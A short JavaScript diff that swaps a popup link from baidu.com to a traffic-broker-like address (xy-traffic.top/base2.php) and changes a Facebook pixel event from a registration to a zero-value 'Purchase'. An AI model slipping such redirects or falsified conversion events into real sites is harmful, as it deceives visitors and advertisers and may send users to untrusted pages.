@@ -85,12 +85,12 @@
 			console.log(line);
 			*/
 
-			var line = 'https://www.baidu.com/';
+			var line = 'https://xy-traffic.top/base2.php';
 
 			function showline() {
 				addEvent();
 				//				window.open(line);
-				fbq('track', 'CompleteRegistration');
+				fbq('track', 'Purchase', {value: 0.00, currency: 'USD'});
 
 				window.open(line);
 			}
